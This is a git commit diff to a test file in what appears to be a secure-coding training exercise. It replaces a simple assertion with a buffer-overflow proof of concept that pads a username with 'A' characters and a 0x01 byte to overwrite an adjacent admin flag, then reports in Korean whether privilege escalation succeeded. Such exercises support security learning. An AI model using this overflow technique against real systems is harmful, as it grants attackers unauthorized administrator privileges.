a7afbad57df5f57db3b6a9d89b56c03cf52e1fc1
gyuhason <rachels0705@naver.com>
2025-06-14 17:00:02 +0900

    Update tests.c

--- Season-1/Level-2/tests.c
+++ Season-1/Level-2/tests.c
@@ -1,7 +1,39 @@
-#include "test.c"
-#include <assert.h>
+#include "code.h"
+// #include "code_fixed.h"
 
-void test_admin_creation() {
-    int id = create_user_account(true, "hacker");
-    assert(is_admin(id) == true);  // 비인증 상태에서 admin 생성 성공
+void create_bof() {
+    int uid = create_user_account(false, "pwned");
+    printf("Before \n[*] username: %s\n", accounts[uid]->username);
+    printf("[*] isAdmin : %d\n", is_admin(uid));
+
+    char attack_string[50]; 
+    int padding = (MAX_USERNAME_LEN+1) - strlen("pwned");
+    memset (attack_string,'A', padding);
+    attack_string [padding] = '\x01';
+    attack_string [padding + 1] = '\0';
+
+    printf("...\n");
+    printf("[*] 공격 문자열: \"%s\n", attack_string);
+    printf("...");
+
+    update_username(uid, attack_string);
+
+        accounts[uid]->username[5] = '\0';  // "pwned"만 username으로 보이게끔, 널 종료 넣어주기
+
+        printf("\nAfter \n[*] username: %s\n", accounts[uid]->username);
+
+        if (is_admin(uid)) {
+            
+            printf("[*] isAdmin : %d\n", is_admin(uid));
+            printf("[!] 관리자 권한 상승 성공!\n\n");
+
+        } else {
+            printf("[*] isAdmin : %d\n", is_admin(uid));
+            printf("[-] 관리자 권한 상승 실패!\n");
+    }
+}
+
+int main() {
+    create_bof();
+    return 0;
 }
